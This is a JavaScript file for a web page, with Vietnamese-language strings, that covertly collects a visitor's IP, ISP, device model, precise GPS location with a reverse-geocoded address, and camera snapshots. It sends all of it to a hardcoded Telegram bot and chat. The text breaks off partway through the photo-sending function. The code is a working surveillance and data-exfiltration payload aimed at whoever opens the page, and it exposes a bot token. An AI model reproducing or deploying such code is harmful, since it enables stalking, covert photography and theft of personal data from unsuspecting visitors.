const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '',
    ip: '',
    isp: '',
    realIp: '',
    address: '',
    country: '', 
    lat: '',
    lon: '',
    device: '',
    os: '',
    camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    const ratio = window.devicePixelRatio;

    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } 
    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        info.os = 'iOS';
        const res = `${screenW}x${screenH}@${ratio}`;
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
        };
        info.device = iphoneModels[res] || 'iPhone/iPad';
    } 
    else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
    } else {
        info.device = 'Không xác định';
        info.os = 'Không rõ';
    }
}

async function getIPs() {
    try {
        const [res1, res2] = await Promise.all([
            fetch('https://api.ipify.org?format=json').then(r => r.json()),
            fetch('https://ipwho.is/').then(r => r.json())
        ]);
        info.ip = res1.ip;
        info.realIp = res2.ip;
        info.isp = res2.connection?.org || 'N/A';
        info.country = res2.country || 'Việt Nam';
    } catch (e) {
        info.ip = 'Bị chặn';
        info.realIp = 'Lỗi kết nối';
    }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(fallbackIPLocation());

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                const acc = pos.coords.accuracy ? ` (±${pos.coords.accuracy.toFixed(1)}m)` : '';
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = (data.display_name || 'Vị trí thực tế') + acc;
                } catch { 
                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
                }
                resolve();
            },
            async () => { await fallbackIPLocation(); resolve(); },
            options
        );
    });
}

async function fallbackIPLocation() {
    try {
        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
        info.lat = data.latitude || '0';
        info.lon = data.longitude || '0';
        info.address = `${data.city}, ${data.region} (Ước tính qua IP)`;
    } catch (e) { info.address = 'Không xác định'; }
}

async function captureCamera(facingMode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', ''); 
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 1000);
            };
        });
    } catch (e) { return null; }
}

function getCaption() {
    const mapsLink = (info.lat && info.lon) 
        ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
        : 'Không rõ';

    return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device} (${info.os})
🌍 IP Dân cư: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendPhotos(frontBlob, backBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    
    const media = [];
    if (front
